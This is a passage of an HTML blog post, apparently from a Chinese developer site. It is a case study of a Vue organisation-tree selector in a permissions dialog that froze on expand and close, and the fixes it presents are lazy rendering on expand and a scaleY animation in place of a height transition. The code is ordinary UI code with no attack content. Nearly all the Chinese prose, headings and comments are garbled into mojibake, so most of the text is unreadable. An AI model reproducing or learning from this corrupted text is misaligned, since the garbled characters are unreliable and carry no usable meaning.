<p><strong>äº¤äº’ä½“éªŒ</strong>ï¼šå‡ åƒèŠ‚ç‚¹æ ‘ç¬é—´å±•å¼€ï¼Œå…³é—­é›¶å»¶è¿Ÿã€‚</p>
</li>
<li>
<p><strong>Performance æ•°æ®</strong>ï¼šå¦‚å›¾æ‰€ç¤ºï¼Œé•¿ä»»åŠ¡ (<code>Long Task</code>) å½»åº•æ¶ˆå¤±ï¼Œæ— çº¢è‰²é˜»å¡è‰²å—ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dffe2fd5a3354652a5ebc920f7d05390~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=uKpRSm%2FUtYKyE726u%2FxILUcGaeQ%3D" alt="ä¼˜åŒ–åç»“æœ.gif" loading="lazy"/></p>
<h2 data-id="heading-2">ä¸€ã€ å®¢æˆ·ç°åœºè¿˜åŸï¼ˆæ¡ˆå‘ç»è¿‡ï¼‰</h2>
<h3 data-id="heading-3">ä¸šåŠ¡èƒŒæ™¯</h3>
<p>å®¢æˆ·æ­£åœ¨ä½¿ç”¨æˆ‘ä»¬çš„ <strong>â€œä¼ä¸šçº§æƒé™ç®¡ç†ç³»ç»Ÿâ€</strong> ã€‚</p>
<p>å‡ºé—®é¢˜çš„ç»„ä»¶æ˜¯ä¸€ä¸ªæ ¸å¿ƒçš„ <strong>ç»„ç»‡æ¶æ„é€‰æ‹©å™¨ï¼ˆTreeSelectï¼‰</strong> ï¼Œå®ƒè¢«åµŒå…¥åœ¨ä¸€ä¸ªé«˜é¢‘ä½¿ç”¨çš„ <strong>â€œæˆæƒå¼¹çª—â€</strong> ä¸­ã€‚</p>
<ul>
<li>
<p><strong>é«˜é¢‘åœºæ™¯</strong>ï¼šç®¡ç†å‘˜éœ€è¦é¢‘ç¹åœ°ç»™ä¸åŒçš„å‘˜å·¥æˆ–éƒ¨é—¨åˆ†é…æƒé™ã€‚</p>
</li>
<li>
<p><strong>æ“ä½œè·¯å¾„</strong>ï¼šç‚¹å‡»â€œå¯è§èŒƒå›´â€ -&gt; å¼¹å‡ºæˆæƒå¼¹çª— -&gt; åœ¨æ ‘å½¢ç»„ä»¶ä¸­æ‰¾åˆ°å¯¹åº”éƒ¨é—¨/äººå‘˜ -&gt; å‹¾é€‰ -&gt; ç¡®å®š/å…³é—­ã€‚</p>
</li>
</ul>
<h3 data-id="heading-4"><strong>æ•°æ®è§„æ¨¡</strong></h3>
<p>è¯¥å®¢æˆ·æ˜¯å¤§å‹ä¼ä¸šï¼Œå…¨é‡ç»„ç»‡æ¶æ„èŠ‚ç‚¹çº¦ä¸º <strong>2700 ä¸ª</strong>ï¼ˆåŒ…å«å¤šçº§éƒ¨é—¨å’Œäººå‘˜ï¼‰ã€‚è¿™ä¸ªæ•°é‡çº§åœ¨ ToB ä¸šåŠ¡ä¸­å…¶å®ä¸ç®—ç‰¹åˆ«å¤§ï¼Œä½†è¶³ä»¥å‹å®æœªç»ä¼˜åŒ–çš„ä»£ç ã€‚</p>
<h3 data-id="heading-5"><strong>æ•…éšœç°è±¡</strong></h3>
<ol>
<li>
<p><strong>æ‰“å¼€å¼¹çª—ï¼ˆå¿«ï¼‰</strong> ï¼šç‚¹å‡»æˆæƒæŒ‰é’®ï¼Œå¼¹çª—ç§’å‡ºï¼ˆè€ç‹ç”¨äº†åˆ†å¸§æ¸²æŸ“è¿›è¡Œé¦–å±ä¼˜åŒ–ï¼Œè¿™ç‚¹æŒºå¥½ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å¯»æ‰¾éƒ¨é—¨ï¼ˆå¡æ­»ï¼‰</strong> ï¼šç®¡ç†å‘˜è¯•å›¾å±•å¼€æ ¹éƒ¨é—¨å»å¯»æ‰¾ä¸‹çº§å•ä½ï¼Œç‚¹å‡»å°ä¸‰è§’çš„ç¬é—´ï¼Œç•Œé¢å¤±å»å“åº”ï¼Œ<strong>Long Task æŒç»­ 10s+</strong> ã€‚ç®¡ç†å‘˜ä»¥ä¸ºæ­»æœºäº†ï¼Œç–¯ç‹‚ç‚¹å‡»ï¼Œç»“æœè¿˜æ˜¯æ²¡ååº”ã€‚</p>
</li>
<li>
<p><strong>å…³é—­/å–æ¶ˆï¼ˆå¡æ­»ï¼‰</strong> ï¼šå¥½ä¸å®¹æ˜“é€‰å®Œäº†ï¼Œç‚¹å‡»â€œç¡®å®šâ€æˆ–â€œå…³é—­â€å¼¹çª—ï¼Œç•Œé¢å†æ¬¡å‡æ­» <strong>4-5s</strong>ï¼Œæ‰èƒ½å…³æ‰å¼¹çª—ã€‚</p>
</li>
</ol>
<h2 data-id="heading-6">äºŒã€ æ·±åº¦ä¾¦æŸ¥ï¼šè°åœ¨è°‹æ€ä¸»çº¿ç¨‹ï¼Ÿ</h2>
<blockquote>
<p><strong>å·¥ç¨‹åŒ–æ€è€ƒï¼šçº¿ä¸Šç›‘æ§èƒ½å‘ç°å—ï¼Ÿ</strong>
å¾ˆå¤šåŒå­¦é—®ï¼šSentry æˆ–å…¶å®ƒæ€§èƒ½ç›‘æ§èƒ½æŠ“åˆ°è¿™ä¸ªé—®é¢˜å—ï¼Ÿ
çº¿ä¸Šç›‘æ§é€šå¸¸åªèƒ½å‘Šè¯‰ä½  <strong>â€œé¡µé¢å¡äº†â€</strong>ï¼ˆç›‘æ§åˆ° <code>Long Task</code> æˆ– <code>INP</code> æŒ‡æ ‡é£™å‡ï¼‰ï¼Œä½†å¾ˆå¤šæ—¶å€™éš¾å‘Šè¯‰ä½ å…·ä½“çš„ <strong>â€œä¸ºä»€ä¹ˆå¡â€</strong>ã€‚
è¦ç¡®è¯Šæ˜¯ JS é€»è¾‘é˜»å¡ï¼Œè¿˜æ˜¯ CSS åŠ¨ç”»å¼•å‘çš„ <strong>Reflow (é‡æ’)</strong>ï¼Œå¿…é¡»ä¾èµ–æœ¬åœ° Chrome DevTools çš„ <strong>Performance é¢æ¿</strong> è¿›è¡Œâ€œCT æ‰«æâ€ã€‚</p>
<p><strong>ğŸ’¡ å°è´´å£«ï¼šå¦‚ä½•ä½¿ç”¨ Performanceï¼Ÿ</strong>
æ‰“å¼€ F12 å¼€å‘è€…å·¥å…· -&gt; åˆ‡æ¢åˆ° <strong>Performance</strong> é¢æ¿ -&gt; ç‚¹å‡»å·¦ä¸Šè§’â€œåœ†ç‚¹â€å¼€å§‹å½•åˆ¶ -&gt; åœ¨é¡µé¢æ“ä½œå¤ç°å¡é¡¿ -&gt; ç‚¹å‡» Stop åœæ­¢ï¼Œå³å¯ç”Ÿæˆåˆ†ææŠ¥å‘Šã€‚</p>
</blockquote>
<p>æˆ‘åœ¨æœ¬åœ° Mock äº† 2700 æ¡å·¦å³çš„æ•°æ®ï¼Œæ¨¡æ‹Ÿäº†â€œæ‰“å¼€ -&gt; å±•å¼€ -&gt; å…³é—­â€çš„å…¨æµç¨‹ï¼Œæ‰“å¼€ Chrome <strong>Performance</strong> ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œçº¢å¾—è·Ÿè¿‡å¹´ä¸€æ ·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17bc9a2b51ae4092961705ccbd77aa8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=5FMKBGG3JlikrGoWEi9%2B5dQxC5I%3D" alt="ç»„ç»‡æ¶æ„æ ‘å“åº”æ…¢é—®é¢˜æ’æŸ¥.gif" loading="lazy"/></p>
<h3 data-id="heading-7">ç¬¬ä¸€æ­¥ï¼šçœ‹â€œå¿ƒç”µå›¾â€ (Performance é¢æ¿)</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87cf18d4a88545e39f23177e037327d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=YpLgBvOsNl%2FYnKQVW%2BHUQxVSiac%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ç°è±¡</strong>ï¼š</p>
<blockquote>
<p>å¾ˆå¤šäººçœ‹åˆ° Performance å¯†å¯†éº»éº»çš„å›¾è¡¨å°±å¤´æ™•ï¼Œå…¶å®è¯€çªå°±ä¸€å¥è¯ï¼š<strong>ä»ä¸Šå¾€ä¸‹çœ‹</strong>ã€‚</p>
<ol>
<li><strong>çœ‹é¡¶éƒ¨</strong>ï¼ˆMain çº¿ç¨‹ï¼‰ï¼š<strong>çº¢è‰²</strong>çš„è‰²å—ä»£è¡¨ <strong>Long Task</strong>ï¼ˆé•¿ä»»åŠ¡ï¼‰ï¼Œæ˜¯å¯¼è‡´é¡µé¢å¡é¡¿çš„ç›´æ¥å…ƒå‡¶ã€‚</li>
<li><strong>çœ‹ä¸­é—´</strong>ï¼ˆè°ƒç”¨æ ˆï¼‰ï¼šåƒå€’ç½®çš„ç«ç„°ä¸€æ ·ï¼Œ<strong>è¶Šå®½</strong>ä»£è¡¨è€—æ—¶è¶Šä¹…ï¼Œ<strong>è¶Šå¾€ä¸‹</strong>ä»£è¡¨å‡½æ•°è°ƒç”¨è¶Šæ·±ã€‚</li>
<li><strong>æ‰¾å‡¶æ‰‹</strong>ï¼šé¡ºç€çº¢æ¡å¾€ä¸‹æ‰¾ï¼Œæœ€åº•ä¸‹çš„é‚£ä¸ªâ€œå®½æ¡æ¡â€ï¼Œé€šå¸¸å°±æ˜¯ç½ªé­ç¥¸é¦–ã€‚</li>
</ol>
</blockquote>
<p><strong>å›åˆ°æœ¬æ¡ˆåˆ†æ</strong>ï¼š</p>
<ol>
<li>
<p><strong>é¡¶éƒ¨æŠ¥è­¦</strong>ï¼šæœ€æ˜¾çœ¼çš„æ˜¯ä¸€æ¡çº¢è‰²æ–œçº¹å¸¦ï¼Œè¯´æ˜ä¸»çº¿ç¨‹ä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ã€‚</p>
</li>
<li>
<p><strong>ä¸­é—´å¯†é›†</strong>ï¼šé¡ºç€çº¢è‰²åŒºåŸŸå¾€ä¸‹çœ‹ï¼Œå…¨æ˜¯å¯†å¯†éº»éº»çš„é»„è‰²å°æ¡ï¼Œæç¤º <code>Animation Frame Fired</code>ï¼ˆåŠ¨ç”»å¸§<code>requestAnimationFrame</code>è§¦å‘ï¼‰ã€‚</p>
</li>
<li>
<p><strong>åº•éƒ¨å®é”¤</strong>ï¼šç»§ç»­é¡ºç€è°ƒç”¨æ ˆ <strong>ä»ä¸Šå¾€ä¸‹</strong> æ‰¾ï¼Œèƒ½çœ‹åˆ°é¢‘ç¹çš„ <code>cloneNode</code>ï¼ˆå…‹éš†èŠ‚ç‚¹ï¼‰è°ƒç”¨ã€‚è¿™è¯´æ˜æ ¸å¿ƒè€—æ—¶åœ¨ DOM æ“ä½œï¼Œæµè§ˆå™¨åœ¨ä¸æ–­åˆ›å»ºæ–°å…ƒç´ ã€‚</p>
</li>
</ol>
<p><strong>ç»“è®º</strong>ï¼šæ ¸å¿ƒè€—æ—¶åœ¨ DOM æ“ä½œï¼Œæµè§ˆå™¨åœ¨ç–¯ç‹‚åŠ ç­é€  DOMã€‚<code>cloneNode</code> å°±åƒæ˜¯åœ¨å¤å°æ–‡ä»¶ï¼Œè¿™è¯´æ˜ä»£ç åœ¨<strong>æ²¡å®Œæ²¡äº†åœ°åˆ¶é€ æ–°çš„é¡µé¢å…ƒç´ </strong>ï¼Œè€Œä¸”æ˜¯ä¸€åˆ»ä¸åœåœ°åœ¨é€ ï¼Œç›´æ¥æŠŠä¸»çº¿ç¨‹å¹²è¶´ä¸‹äº†ã€‚</p>
<h3 data-id="heading-8">ç¬¬äºŒæ­¥ï¼šé¡ºè—¤æ‘¸ç“œ (æ‰¾ä»£ç )</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d00c4d1ccee4e14a3f45a0f46d35185~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=XbplzkEebZOah8wafv7NLXy256c%3D" alt="image.png" loading="lazy"/></p>
<p><strong>çº¿ç´¢</strong>ï¼š
Performance é¢æ¿æ˜ç¡®æŒ‡å‡ºäº†å‡¶æ‰‹æ˜¯ <code>ReSubMenu.vue</code> é‡Œçš„ <code>renderVisibleData</code> å‡½æ•°ã€‚</p>
<p><strong>ä»£ç é•¿è¿™æ ·</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªåˆ†å¸§æ¸²æŸ“å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderVisibleData</span>(<span class="hljs-params">data, index = <span class="hljs-number">0</span></span>) {
  <span class="hljs-comment">// 1. å…ˆæ¸²æŸ“ä¸€å°éƒ¨åˆ†ï¼ˆæ¯”å¦‚ 5 ä¸ªï¼‰</span>
  visibleChildrenData.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>(...data.<span class="hljs-title function_">slice</span>(index, index + <span class="hljs-number">5</span>))

  <span class="hljs-comment">// 2. å¦‚æœè¿˜æœ‰æ•°æ®æ²¡æ¸²æŸ“å®Œï¼Œç”³è¯·ä¸‹ä¸€å¸§æ¥ç€å¹²</span>
  <span class="hljs-keyword">if</span> (è¿˜å‰©æœ‰æ•°æ®) {
    <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">renderVisibleData</span>(data, index + <span class="hljs-number">5</span>) <span class="hljs-comment">// &lt;--- æ¡ˆå‘åœ°ç‚¹ï¼</span>
    })
  }
}
</code></pre>
<p><strong>åŸæœ¬çš„ç®—ç›˜</strong>ï¼š
å†™è¿™æ®µä»£ç çš„åˆè¡·æ˜¯å¥½çš„â€”â€”<strong>â€œåˆ†å¸§æ¸²æŸ“â€</strong>ã€‚
ä¸ºäº†é˜²æ­¢æŸä¸€å±‚çº§ä¸‹æœ‰å‡ åƒä¸ªèœå•é¡¹æŠŠé¡µé¢å¡æ­»ï¼Œç‰¹æ„ç”¨äº† <code>requestAnimationFrame</code>ï¼Œæ„æ€æ˜¯ï¼šâ€œæµè§ˆå™¨å¤§å“¥ï¼Œæ‚¨åˆ«æ€¥ï¼Œå’±ä»¬æ¯å¸§åªç”» 5 ä¸ªï¼Œæ…¢æ…¢æ¥ã€‚â€</p>
<h3 data-id="heading-9">ç¬¬ä¸‰æ­¥ï¼šçœŸç›¸å¤§ç™½ (é€»è¾‘æ¼æ´)</h3>
<p><strong>é—®é¢˜å‡ºåœ¨å“ªï¼Ÿ</strong>
çœ‹ä¼¼ä¼˜é›…çš„â€œæ…¢æ…¢æ¥â€ï¼Œå¿½ç•¥äº†ä¸€ä¸ªè‡´å‘½çš„å‰æï¼š<strong>é€’å½’ç»„ä»¶çš„å åŠ æ•ˆåº”</strong>ã€‚</p>
<p>æˆ‘ä»¬çš„æ ‘å½¢ç»„ä»¶ç»“æ„å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼ˆå…¸å‹çš„æ— é™å¥—å¨ƒï¼‰ï¼š</p>
<ul>
<li>å…¥å£ (AuthorizedMenu.vue)
<ul>
<li>TreeSelect (å¤–å±‚å®¹å™¨)
<ul>
<li>ReSubMenu (é€’å½’çš„å¼€å§‹)
<ul>
<li>SubMenu (åŠ¨ç”»/æŠ˜å )
<ul>
<li>MenuItem (èŠ‚ç‚¹é¡¹)</li>
<li>ReSubMenu (å­èŠ‚ç‚¹ -&gt; å¥—å¨ƒå¼€å§‹)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>è¿™å°±æ„å‘³ç€ï¼Œå¦‚æœä½ çš„æ ‘æ•°æ®æœ‰ 5 å±‚æ·±ï¼Œç»„ä»¶å°±ä¼šè‡ªå·±æŠŠè‡ªå·±åµŒå¥— 5 å±‚ã€‚</p>
<p>æˆ‘åˆçœ‹äº†ä¸€çœ¼è´Ÿè´£å±•å¼€æ”¶èµ·èœå•åŠ¨ç”»çš„çˆ¶ç»„ä»¶ <code>SubMenu.vue</code>ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- è¿™é‡Œåªç”¨äº† CSS æ§åˆ¶é«˜åº¦æ¥æŠ˜å ï¼Œæ²¡æœ‰ç”¨ v-if --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"subItem"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ height: ... }"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><strong>æ¡ˆæƒ…è¿˜åŸ</strong>ï¼š</p>
<ol>
<li>
<p><strong>çœ‹ä¸è§çš„â€œå¤§å†›â€</strong>ï¼š
è™½ç„¶ç•Œé¢ä¸Šèœå•æ˜¯æ”¶èµ·çš„ï¼Œä½†å› ä¸ºæ²¡åŠ  <code>v-if</code> æ§åˆ¶ï¼Œ<strong>æ•´æ£µæ ‘ 2000 å¤šä¸ªèŠ‚ç‚¹å…¶å®éƒ½åœ¨åå°æ‚„æ‚„æŒ‚è½½äº†</strong>ã€‚è¿™å°±å¥½æ¯”ä½ åªç‚¹äº†ä¸€ç›˜èŠ±ç”Ÿç±³ï¼Œåå¨å´æŠŠæ»¡æ±‰å…¨å¸­éƒ½å¤‡å¥½äº†ã€‚</p>
</li>
<li>
<p><strong>åˆ†å¸§ç­–ç•¥å¤±æ•ˆ</strong>ï¼š
è€ç‹çš„â€œåˆ†å¸§æ¸²æŸ“â€æœ¬æ„æ˜¯å¥½çš„ï¼šâ€œå¤§å®¶åˆ«æ€¥ï¼Œæ’å¥½é˜Ÿï¼Œä¸€å¸§ç”» 5 ä¸ªã€‚â€
ä½†å› ä¸ºæ˜¯é€’å½’ç»„ä»¶ï¼Œ<strong>å‡ ç™¾ä¸ªç»„ä»¶å®ä¾‹æ˜¯åŒæ—¶å¯åŠ¨çš„</strong>ã€‚</p>
</li>
<li>
<p><strong>èœå¸‚åœºæ•ˆåº”</strong>ï¼š</p>
<ul>
<li>ç¬¬ä¸€å±‚ç»„ä»¶å–Šï¼šâ€œæµè§ˆå™¨è€å¸ˆï¼Œéº»çƒ¦å¸®æˆ‘ç”» 5 ä¸ªï¼â€</li>
<li>ç¬¬äºŒå±‚ç»„ä»¶ä¹Ÿå–Šï¼šâ€œæˆ‘ä¹Ÿè¦ç”» 5 ä¸ªï¼â€</li>
<li>ç¬¬ N å±‚ç»„ä»¶é½å£°å–Šï¼šâ€œè¿˜æœ‰æˆ‘ï¼è¿˜æœ‰æˆ‘ï¼â€</li>
</ul>
</li>
</ol>
<p><strong>ç»“æœ</strong>ï¼šæµè§ˆå™¨ç¬é—´æ‡µäº†ã€‚è™½ç„¶æ¯ä¸ªäººåªè¯·æ±‚ç”» 5 ä¸ªï¼Œä½†è¿™å‡ ç™¾ä¸ªç»„ä»¶åŒæ—¶è¯·æ±‚ï¼Œç¬é—´å°±å †ç§¯äº†æˆåƒä¸Šä¸‡ä¸ª <code>cloneNode</code> ä»»åŠ¡ã€‚è¿™å°±å¥½æ¯”å‡ ç™¾åªé¸­å­åŒæ—¶åœ¨å«ï¼Œä¸»çº¿ç¨‹ç›´æ¥è¢«<strong>é«˜å¹¶å‘çš„ DOM æ“ä½œ</strong>ç»™å†²å®äº†ã€‚</p>
<h2 data-id="heading-10">ä¸‰ã€ ç´§æ€¥æ•‘æ´ï¼šå­¦ä¼šâ€œå·æ‡’â€</h2>
<p>åæ§½å½’åæ§½ï¼ŒBug è¿˜æ˜¯å¾—ä¿®ã€‚è§£å†³åŠæ³•å°±æ˜¯ä¸‰ä¸ªå­—ï¼š<strong>æ‡’åŠ è½½</strong>ã€‚</p>
<h3 data-id="heading-11">æ ¸å¿ƒé€»è¾‘</h3>
<p>çœ‹ä¸è§çš„èœå•ï¼Œåšå†³ä¸æ¸²æŸ“ï¼
åªæœ‰å½“ç”¨æˆ·ç‚¹å‡»â€œå±•å¼€â€æŒ‰é’®é‚£ä¸€åˆ»ï¼Œæˆ‘æ‰å¼€å§‹å»æ¸²æŸ“å­èœå•ã€‚</p>
<h3 data-id="heading-12">ä»£ç æ”¹åŠ¨</h3>
<p>æŠŠåŸæ¥çš„â€œä¸€ä¸Šæ¥å°±æ¸²æŸ“â€æ”¹æˆâ€œç›¯ç€å¼€å…³çœ‹â€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReSubMenu.vue</span>

<span class="hljs-comment">// åªæœ‰å½“ isExpand (å±•å¼€çŠ¶æ€) å˜æˆ true æ—¶ï¼Œæ‰å¼€å§‹å¹²æ´»</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> props.<span class="hljs-property">data</span>.<span class="hljs-property">isExpand</span>,
  <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (val) {
      <span class="hljs-comment">// åªæœ‰å±•å¼€æ—¶ï¼Œä¸”ä¹‹å‰æ²¡æ¸²æŸ“è¿‡ï¼Œæ‰å¯åŠ¨åˆ†å¸§æ¸²æŸ“</span>
      <span class="hljs-keyword">if</span> (visibleChildrenData.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
        <span class="hljs-title function_">renderVisibleData</span>(props.<span class="hljs-property">data</span>?.<span class="hljs-property">children</span>)
      }
    } <span class="hljs-keyword">else</span> {
       visibleChildrenData.<span class="hljs-property">value</span> = []
    }
  },
  { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> }
)
</code></pre>
<h3 data-id="heading-13">å…³é—­å¼¹çª—å¡æ­»</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ffac7e3c6347a194162776075dbcf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=sYzqiwrmy1sCjHJXTd%2BS8WOrhrc%3D" alt="å…³é—­å¼¹çª—æ…¢é—®é¢˜æ’æŸ¥.gif" loading="lazy"/></p>
<p>å®¢æˆ·ä¹‹å‰åé¦ˆâ€œå…³é—­å¼¹çª—ä¹Ÿå¡â€ï¼Œæ˜¯å› ä¸ºåŒäº‹è€ç‹çš„ä»£ç è®©ç»„ä»¶ä¸€å¼€å§‹åŠ è½½äº†å‡ åƒä¸ªèŠ‚ç‚¹ï¼Œå†…å­˜ä¸­å°±å †ç§¯äº†å‡ åƒä¸ªå¤æ‚çš„ç»„ä»¶å®ä¾‹ã€‚</p>
<p>ç‚¹å‡»å…³é—­å¼¹çª—çš„é‚£ä¸€åˆ»ï¼Œä¸»çº¿ç¨‹è¢« GCï¼ˆåƒåœ¾å›æ”¶ï¼‰å’Œ Vueç»„ä»¶çš„å¸è½½ä»»åŠ¡ï¼ˆ<code>beforeUnmount</code> / <code>unmounted</code>ç­‰ï¼‰ç¬é—´æŒ¤çˆ†ã€‚</p>
<p><strong>æˆªå›¾è¯æ®</strong>ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/757b3a8e1a3a432d81fd9240f1f2087c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=4iGg%2FNPdlq%2FpcXnSTFvAjrlRDbI%3D" alt="image.png" loading="lazy"/>
å¤§å®¶çœ‹è¿™å¼ æˆªå›¾ï¼Œå…³é—­å¼¹çª—çš„ä¸€ç¬é—´ï¼Œ<code>removeChild</code> æ“ä½œç«Ÿç„¶è€—æ—¶ <strong>5.14s</strong>ï¼è¿™æ„å‘³ç€æµè§ˆå™¨ä¸»çº¿ç¨‹è¢«è¿™ä¸ªå·¨å¤§çš„â€œæ‹†è¿å·¥ç¨‹â€å½»åº•å µæ­»ï¼Œç”¨æˆ·åªèƒ½å¯¹ç€å±å¹•å‘å‘†ã€‚</p>
<h2 data-id="heading-14">å››ã€ è¿›é˜¶æˆ˜æœ¯ï¼šä¸‰ç»´æ²»ç†ç­–ç•¥</h2>
<p>å•çº¯çš„æ‡’åŠ è½½è§£å†³äº†â€œåˆå§‹åŒ–â€é—®é¢˜ï¼Œä½†ä¸ºäº†è¾¾åˆ°æè‡´ä½“éªŒï¼Œæˆ‘ä»¬è¿˜å¼•å…¥äº†å¦å¤–ä¸¤ä¸ªç»´åº¦çš„ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-15">1. æ¸²æŸ“å±‚ï¼šç”¨ ScaleY æ›¿ä»£ Height åŠ¨ç”»</h3>
<p><strong>æ’æŸ¥</strong>ï¼š</p>
<ul>
<li>
<p>æˆ‘çœ‹äº†ä¸‹ CSSï¼Œèœå•çš„å±•å¼€/æ”¶èµ·æ˜¯ç”¨ <code>transition: height</code> åšçš„â€œçª—å¸˜â€æ•ˆæœã€‚</p>
</li>
<li>
<p>æ¯ä¸€çº§èœå•éƒ½æ˜¯æ”¹é«˜åº¦ <code>height</code>ï¼ˆæ”¶èµ·ä¸º 0ï¼Œå±•å¼€ä¸ºèŠ‚ç‚¹å†…å®¹é«˜åº¦ï¼‰ã€‚</p>
</li>
<li>
<p><code>height</code> æ˜¯å¸ƒå±€å±æ€§ï¼ŒåŠ¨å®ƒå°±ä¼šè§¦å‘ <code>Reflow</code>ï¼ˆé‡æ’ï¼‰ï¼Œæµè§ˆå™¨éœ€è¦æŠŠå—å½±å“çš„å¸ƒå±€é“¾è·¯é‡æ–°ç®—ä¸€éã€‚</p>
</li>
<li>
<p>é€’å½’æ ‘ä¼šå±‚å±‚ä¼ å¯¼ï¼šä½ ç‚¹å¼€ä¸€å±‚ä¼šç‰µåŠ¨ä¸‹é¢æ•´æ®µå­æ ‘ä¸€èµ·ç®—ï¼Œé“¾è·¯å¾ˆé•¿ï¼Œä½ç«¯æœºåˆ†åˆ†é’Ÿå¡ä½</p>
</li>
</ul>
<p><strong>å±•å¼€èŠ‚ç‚¹å¡é¡¿ç°è±¡å›¾ï¼š</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d525c3b276149d68df6b57e439876f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5LiA5qC355qE5bCR5bm0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767658302&amp;x-signature=79PDp69%2BjICr75NDrnlXnJUHx8Y%3D" alt="å±•å¼€èœå•å¡é¡¿.gif" loading="lazy"/></p>
<p><strong>ä¼˜åŒ–</strong>ï¼š
æ”¹ä¸ºä½¿ç”¨ CSS3 çš„ <code>transform: scaleY</code>ï¼ŒåŒæ ·å¯ä»¥è¾¾åˆ°ä¸æ»‘å±•å¼€çš„æ•ˆæœã€‚</p>
<p><strong>ç®€å•ç†è§£ ä½¿ç”¨ScaleYå®ç°å±•å¼€åŠ¨ç”»æ•ˆæœçš„åŸç†</strong>ï¼š</p>
<ul>
<li><strong>å˜çš„æ˜¯ä»€ä¹ˆï¼Ÿ</strong> <code>scaleY</code> æ”¹å˜çš„æ˜¯å…ƒç´ åœ¨ <strong>Y è½´ï¼ˆç«–å‘ï¼‰</strong> çš„ç¼©æ”¾æ¯”ä¾‹ã€‚</li>
<li><strong>æ€ä¹ˆå˜ï¼Ÿ</strong> ä» <code>0</code>ï¼ˆå‹æ‰æˆä¸€æ¡çº¿ï¼Œå®Œå…¨çœ‹ä¸è§ï¼‰è¿‡æ¸¡åˆ° <code>1</code>ï¼ˆæ‹‰ä¼¸å›åŸæœ¬çš„é«˜åº¦ï¼‰ã€‚</li>
<li><strong>ä¸ºä»€ä¹ˆåƒå±•å¼€ï¼Ÿ</strong> é…åˆ <code>transform-origin: top</code>ï¼ˆå›ºå®šé¡¶éƒ¨ï¼‰ï¼Œå°±åƒæŠŠå·å¸˜é—¨ä»ä¸Šå¾€ä¸‹æ‹‰ä¸‹æ¥ä¸€æ ·ï¼Œè§†è§‰ä¸Šå°±æ˜¯å®Œç¾çš„â€œå±•å¼€â€æ•ˆæœã€‚</li>
</ul>
<p><strong>æ·±åº¦åŸç†</strong>ï¼š<code>transform</code> å±æ€§ä¸ä¼šè§¦å‘ Reflowï¼Œåªä¼šè§¦å‘ <strong>Composite (åˆæˆ)</strong>ï¼Œè¿™ä¸ªè¿‡ç¨‹å®Œå…¨ç”± GPU å¤„ç†ï¼Œä¸å ç”¨ä¸»çº¿ç¨‹ CPU èµ„æºã€‚</p>
<blockquote>
